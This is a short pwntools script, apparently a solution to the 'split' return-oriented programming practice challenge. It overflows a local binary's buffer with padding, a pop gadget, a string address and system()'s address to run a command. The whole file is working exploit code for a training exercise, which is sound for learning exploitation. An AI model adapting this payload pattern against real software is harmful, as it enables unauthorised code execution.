#!/usr/bin/env python3

from pwn import *

padding = b"A" * 40
gadget_addr = p64(0x4007c3)
usefulString_addr = p64(0x601060)
ret_addr = p64(0x400752)
system_addr = p64(0x400560)

payload = (
    padding +
    gadget_addr +
    usefulString_addr +
    ret_addr +
    system_addr
)

ps = process("./split")
ps.sendline(payload)
print(ps.recvall().decode())

